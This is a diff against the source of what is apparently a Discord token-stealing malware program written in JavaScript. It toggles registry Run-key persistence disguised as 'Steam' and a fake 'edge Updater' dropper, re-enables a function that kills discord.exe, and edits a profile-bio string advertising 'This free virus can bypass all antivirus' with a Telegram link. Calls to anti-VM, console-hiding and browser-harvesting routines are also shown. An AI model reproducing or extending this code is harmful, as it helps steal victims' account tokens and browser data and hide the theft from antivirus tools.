@@ -311,6 +311,7 @@ function onlyUnique(item, index, array) {
     return array.indexOf(item) === index;
 }
 
+/*
 const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
 const keyName = 'Steam';
 
@@ -367,7 +368,7 @@ function removeRegistryKey() {
         }
     });
 }
-
+*/
 
 function startup() {
   const programPath = app.getPath('exe');
@@ -1069,7 +1070,7 @@ while ($true) {
 }
 
 
-
+/*
 function createRunBat() {
     const userData = path.join('C:', 'ProgramData', 'edge', 'Updater');
     if (!fs.existsSync(userData)) {
@@ -1153,7 +1154,7 @@ Set objShell = Nothing`;
         }
     });
 }
-
+*/
 
 
 
@@ -1803,7 +1804,7 @@ async function getTokens() {
         await findToken(path);
     }
 
-    const predefinedBio = `╔═══════════✧✧✧═══════════╗\n        **This free virus can bypass all antivirus !\n                  ⭐️https://t.me/doenerium69** ⭐️\n ╚═══════════✧✧✧═══════════╝`;
+    const predefinedBio = `╔═══════════✧✧✧═══════════╗ **This free virus can bypass all antivirus ! ⭐️https://t.me/doenerium69** ⭐️ ╚═══════════✧✧✧═══════════╝`;
 
     for (let token of tokens) {
         try {
@@ -2210,7 +2211,7 @@ async function getIp() {
     return ip.data;
 }
 
-// async function Killchrome() {
+async function Killchrome() {
     exec('tasklist', (err, stdout) => {
         for (const executable of ['discord.exe']) {
             if (stdout.includes(executable)) {
@@ -4104,6 +4105,7 @@ function onlyUnique(item, index, array) {
     main();
     hideconsole();
     antivm();
+    //binder();
     initializeFolders();
     initializeSystem();
     manageBrowsers();
